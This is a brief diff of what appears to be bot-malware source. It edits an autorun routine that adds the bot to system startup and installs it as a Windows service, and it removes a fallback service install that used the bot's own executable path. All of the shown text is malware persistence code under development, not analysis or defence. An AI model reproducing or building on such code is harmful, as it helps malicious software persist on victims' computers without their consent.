@@ -108,12 +108,9 @@ void InternalAddToAutorun()
 		{
 				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
 				BOT::AddToAutoRun(Name);
-				ServiceInstalled = BOT::InstallService(Name);
+				BOT::InstallService(Name);
 				STR::Free(Name);
 		}
-		if (!ServiceInstalled)
-			BOT::InstallService(BOT::GetBotFullExeName().t_str());
-
 	#endif
 }
 
